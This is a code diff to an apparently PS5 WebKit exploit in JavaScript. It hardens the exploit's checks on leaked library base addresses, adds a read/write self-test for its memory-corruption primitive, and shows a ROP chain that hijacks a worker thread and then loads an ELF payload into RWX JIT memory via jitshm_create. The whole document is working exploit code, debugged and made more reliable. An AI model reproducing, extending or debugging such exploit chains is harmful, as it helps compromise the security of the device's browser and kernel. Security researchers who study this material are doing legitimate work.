@@ -1039,46 +1039,56 @@ async function initROP() {
     log(`libKernel: 0x${libKernelBase.toString()}`, "log-ok");
 
     // Firmware / offsets sanity check. On a firmware mismatch the three
-    // read8() base resolutions above come back as garbage (zero / non
-    // canonical), the ROP chain then writes those bogus values and WebKit
-    // shows the "You're trying to write a non number/non int64 value?"
-    // dialog in a loop and finally dies with "not enough memory space" and
-    // crashes the whole browser. Detect it now and abort cleanly instead.
-    const plausibleBase = (b) => Number.isFinite(b.low) && Number.isFinite(b.hi)
-        && (b.low !== 0 || b.hi !== 0)
-        && b.hi > 0x0 && b.hi < 0x40000000;
-    const wkOK = plausibleBase(libSceNKWebKitBase);
-    const lkOK = plausibleBase(libKernelBase);
-    const lcOK = plausibleBase(libSceLibcInternalBase);
-    if (!(wkOK && lkOK && lcOK)
-        || libSceLibcInternalBase.low === libSceNKWebKitBase.low
-        || libKernelBase.low === libSceNKWebKitBase.low) {
-        log(`Offset table does NOT match this WebKit build (wk=0x${libSceNKWebKitBase.toString()}, lk=0x${libKernelBase.toString()}, lc=0x${libSceLibcInternalBase.toString()}). Aborting before ROP to avoid the WebKit OOM crash.`, "log-err");
-        throw new Error(`Offsets do not match firmware ${fwStr}; aborting before ROP (avoids WebKit OOM crash).`);
+    // read8() base resolutions above come back as garbage, the ROP chain then
+    // writes those bogus values and WebKit shows the "You're trying to write a
+    // non number/non int64 value?" dialog before finally dying with "not
+    // enough memory space". Detect it now and abort cleanly instead.
+    //
+    // The previous version of this test was `hi > 0 && hi < 0x40000000`,
+    // which is satisfied by almost any 64-bit value -- it accepted a
+    // 566 GB "WebKit base" and the chain then wrote to wild addresses.
+    const baseNum = (b) => (b.hi >>> 0) * 0x100000000 + (b.low >>> 0);
+    const USER_BAND_HI = 0x100;          // 0x1000000000 = 64 GB is plenty
+    const baseInBand = (b) => {
+        const n = baseNum(b);
+        return Number.isFinite(n) && n > 0x100000000 && n < USER_BAND_HI * 0x100000000
+            && (b.low >>> 0) % 0x1000 === 0;
+    };
+    // A real mapped library reads back as varied, non-zero bytes. A bogus
+    // address reads as zeros or one repeated qword.
+    function baseLooksLikeCode(base) {
+        try {
+            const seen = new Set();
+            for (let i = 0; i < 0x40; i += 8) {
+                const v = p.read8(base.add32(i));
+                if ((v.low >>> 0) === 0 && (v.hi >>> 0) === 0) return false;
+                seen.add(v.toString());
+            }
+            return seen.size > 1;
+        } catch (e) { return false; }
     }
-    log(`Resolved bases pass the offset plausibility check (wk=0x${libSceNKWebKitBase.toString()}, lk=0x${libKernelBase.toString()}, lc=0x${libSceLibcInternalBase.toString()})`, "log-ok");
+
+    const named = [["wk", libSceNKWebKitBase], ["lc", libSceLibcInternalBase], ["lk", libKernelBase]];
+    const bad = named.filter(([, b]) => !baseInBand(b) || !baseLooksLikeCode(b)).map(([n]) => n);
+    // The three libraries are loaded close together; a huge spread means at
+    // least one of them is wrong even if it happens to be readable.
+    const nums = named.map(([, b]) => baseNum(b));
+    const spread = Math.max(...nums) - Math.min(...nums);
+    if (spread > 0x40000000) bad.push("spread");
+
+    if (bad.length) {
+        log(`Resolved bases are NOT usable (${bad.join(",")}) -- `
+            + `wk=0x${libSceNKWebKitBase.toString()}, `
+            + `lc=0x${libSceLibcInternalBase.toString()}, `
+            + `lk=0x${libKernelBase.toString()}, spread=0x${spread.toString(16)}. `
+            + `Aborting: a bad base would send the ROP chain to wild addresses.`, "log-err");
+        throw new Error(`Implausible module bases (${bad.join(",")}); aborting before ROP.`);
+    }
+    log(`Resolved bases look like real libraries `
+        + `(wk=0x${libSceNKWebKitBase.toString()}, lk=0x${libKernelBase.toString()}, `
+        + `lc=0x${libSceLibcInternalBase.toString()}, spread=0x${spread.toString(16)})`, "log-ok");
 
     surveyThreads(p, libKernelBase, offsets);
-
-    // "Not enough system memory space" is ambiguous on the PS5: a genuinely
-    // full heap and a CORRUPTED heap both report it, and a corrupted one only
-    // starts failing after whatever wrote into it. The carrier writes three
-    // known marker bytes (0x3c in the window, 0x3c in its mirror, 0xa5 in the
-    // target view), so assertHome() tells us which one we are looking at.
-    //   true  -> the heap is fine, the failure is real exhaustion
-    //   false -> a ROP chain wrote somewhere wrong and wrecked the heap
-    const carrier = exploitState.carrier;
-    function health(tag) {
-        let ok;
-        try {
-            ok = (carrier && typeof carrier.assertHome === "function")
-                ? carrier.assertHome() : null;
-        } catch (err) { ok = "threw:" + err.message; }
-        const good = ok === true;
-        log(`health[${tag}]: assertHome=${ok}`, good ? "log-ok" : "log-err");
-        return good;
-    }
-    health("after-primitive");
 
     let gadgets = {};
     for (let g in offsets.wk_gadgetmap) gadgets[g] = libSceNKWebKitBase.add32(offsets.wk_gadgetmap[g]);
@@ -1117,6 +1127,27 @@ async function initROP() {
         setAddr(addr, size);
         og_array.setAddr = setAddr;
         return og_array;
+    }
+
+    // A genuine liveness test for the read/write primitive, defined here
+    // because it needs malloc() (and therefore nogc) to be initialised.
+    // NOTE: the carrier's own assertHome() cannot be used for this -- mem.js
+    // deliberately calls releaseFakeCell(), which nulls liveCandidate, so
+    // assertHome() returns false forever and mem.js ASSERTS that it is false.
+    // Checking it earlier just labelled a healthy run as "corrupt".
+    const probe = malloc(0x20);
+    const pattern = [0x5a, 0xa5, 0xc3, 0x3c, 0xde, 0xad, 0xbe, 0xef];
+    function selfTest(tag) {
+        let ok = true;
+        try {
+            for (let i = 0; i < 8; i++) p.write1(probe.add32(i), pattern[i]);
+            for (let i = 0; i < 8; i++) if (p.read1(probe.add32(i)) !== pattern[i]) ok = false;
+        } catch (e) { ok = false; }
+        log(`selftest[${tag}]: r/w round-trip ${ok ? "OK" : "FAILED"}`, ok ? "log-ok" : "log-err");
+        return ok;
+    }
+    if (!selfTest("after-primitive")) {
+        throw new Error("the read/write primitive is not answering; aborting before ROP");
     }
 
     // The chain hijacks a worker thread's saved return address, so that slot
@@ -1259,21 +1290,19 @@ async function initROP() {
         }
         await new Promise(r => { ropWorker.onmessage = r; ropWorker.postMessage(0); });
         log("ROP: chain finished, worker replied (longjmp restore OK)", "log-info");
-        // The chain just ran on a hijacked thread. If it wrote anywhere wrong
-        // the JSC heap is now corrupt and the NEXT allocation reports
-        // "not enough system memory space" -- so check the markers now.
-        if (!health("post-chain")) {
-            log("ROP: heap markers are wrong -- the chain corrupted the WebProcess. "
-                + "Any 'not enough system memory' from here on is a symptom, not a cause.",
-                "log-err");
-        }
+        // The chain just ran on a hijacked thread. If it wrote to a wild
+        // address the primitive stops answering and every later allocation
+        // reports "not enough system memory space" -- so re-test it now.
+        // (NB: the carrier's own assertHome() is useless here; mem.js calls
+        // releaseFakeCell(), so it is false by design.)
+        selfTest("post-chain");
     }});
 
     exploitState.chain = chain;
-    return { p, chain, gadgets, syscalls, malloc, array_from_address, nogc, health, libSceNKWebKitBase, libSceLibcInternalBase, libKernelBase, libcMemcpy: libSceLibcInternalBase.add32(offsets.lc_memcpy) };
+    return { p, chain, gadgets, syscalls, malloc, array_from_address, nogc, selfTest, libSceNKWebKitBase, libSceLibcInternalBase, libKernelBase, libcMemcpy: libSceLibcInternalBase.add32(offsets.lc_memcpy) };
 }
 
-async function loadElfldrViaROP({ p, chain, syscalls, nogc, libcMemcpy, health }) {
+async function loadElfldrViaROP({ p, chain, syscalls, nogc, libcMemcpy, selfTest }) {
     log("Loading elfldr-ps5-1360.elf via ROP...", "log-info");
     const res = await fetch("payloads/elfldr-ps5-1360.elf", { cache: "no-store" });
     if (!res.ok) throw new Error(`Failed to fetch elfldr: HTTP ${res.status}`);
@@ -1348,8 +1377,8 @@ async function loadElfldrViaROP({ p, chain, syscalls, nogc, libcMemcpy, health }
     // then went on to write 397 KB of ELF at 0xffffffffffffffff, which is what
     // ended in "not enough memory space".
     log(`entering first ROP syscall: jitshm_create(0, 0x${imageSize.toString(16)}, PROT_RWX)`, "log-info");
-    if (typeof health === "function" && !health("before-jitshm")) {
-        throw new Error("heap was already corrupt before the first syscall");
+    if (typeof selfTest === "function" && !selfTest("before-jitshm")) {
+        throw new Error("the primitive stopped answering before the first syscall");
     }
     const jitFd = await chain.syscall_int32(SYS_JITSHM_CREATE, 0, imageSize, PROT_RWX);
     if (!(jitFd >= 0)) throw new Error(`jitshm_create(0x215) failed: fd=${jitFd}`);
